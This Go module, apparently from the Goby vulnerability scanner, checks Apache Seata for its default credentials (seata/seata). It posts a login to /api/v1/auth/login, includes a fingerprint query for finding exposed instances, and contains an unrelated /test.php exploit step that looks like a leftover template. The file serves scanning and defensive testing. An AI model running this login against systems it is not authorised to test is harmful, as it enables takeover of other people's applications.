package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Seata /api/v1/auth/login Default Password Vulnerability",
    "Description": "<p>Seata is an open source distributed transaction solution dedicated to providing high performance and easy to use distributed transaction services in a microservices architecture. Seata has a default password vulnerability. Attackers can control the entire application platform through this vulnerability.</p>",
    "Product": "Apache Seata",
    "Homepage": "https://seata.apache.org/",
    "DisclosureDate": "2024-07-11",
    "PostTime": "2024-07-11",
    "Author": "Town",
    "FofaQuery": "body=\"img/seata_logo_small.jpeg\" && title=\"seata\"",
    "GobyQuery": "body=\"img/seata_logo_small.jpeg\" && title=\"seata\"",
    "Level": "2",
    "Impact": "<p>Seata has a weak password vulnerability.Attackers can control the entire application platform through this vulnerability.</p>",
    "Recommendation": "<p>Contact your vendor to update, or change password in time.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/v1/auth/login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json",
                    "Accept": "application/json, text/plain, */*"
                },
                "data_type": "text",
                "data": "{\"username\":\"seata\",\"password\":\"seata\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"code\":\"200\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "Seata /api/v1/auth/login 默认口令漏洞",
            "Product": "Apache Seata",
            "Description": "<p>Seata 是一款开源的分布式事务解决方案，致力于在微服务架构下提供高性能和简单易用的分布式事务服务。Seata 存在默认口令漏洞。攻击者可通过该漏洞控制整个应用平台。<br></p>",
            "Recommendation": "<p>联系厂商更新，或及时更改密码。<br><br></p>",
            "Impact": "<p>Seata 存在默认口令漏洞。攻击者可通过该漏洞控制整个应用平台。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Seata /api/v1/auth/login Default Password Vulnerability",
            "Product": "Apache Seata",
            "Description": "<p>Seata is an open source distributed transaction solution dedicated to providing high performance and easy to use distributed transaction services in a microservices architecture. Seata has a default password vulnerability. Attackers can control the entire application platform through this vulnerability.<br></p>",
            "Recommendation": "<p>Contact your vendor to update, or change password in time.<br></p>",
            "Impact": "<p>Seata has a weak password vulnerability.Attackers can control the entire application platform through this vulnerability.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10969"
}`

	setPayloadRequestACBIGCUVCW28UDBU2B9B := func(hostInfo *httpclient.FixUrl) (string, string, error, string, string) {
		requestResult := ""
		url := "/api/v1/auth/login"
		vulInfo := "seata:seata"
		vulPath := "/#/login"
		makeRequest := httpclient.NewPostRequestConfig(url)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		makeRequest.Data = "{\"username\":\"seata\",\"password\":\"seata\"}"
		makeRequest.Header.Store("Content-Type", "application/json")
		makeRequest.Header.Store("Accept", "application/json, text/plain, */*")
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			requestResult = resp.RawBody
			return requestResult, url, nil, vulInfo, vulPath
		} else {
			return requestResult, url, err, vulInfo, vulPath
		}

	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			runPayload := setPayloadRequestACBIGCUVCW28UDBU2B9B

			text := "\"code\":\"200\""
			pocResult, _, err, vulInfo, vulPath := runPayload(hostInfo)
			if err != nil {
				return false
			}
			if strings.Contains(pocResult, text) {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			runPayload := setPayloadRequestACBIGCUVCW28UDBU2B9B

			text := "\"code\":\"200\""
			pocResult, _, err, _, _ := runPayload(expResult.HostInfo)
			if err != nil {
				expResult.Success = false
				expResult.OutputType = "html"
				expResult.Output = err.Error()
				return expResult
			}
			if strings.Contains(pocResult, text) {
				expResult.Success = true
				expResult.OutputType = "text"
				expResult.Output = `Please use "` + "seata/seata" + `" to login`
			}
			return expResult
		},
	))
}
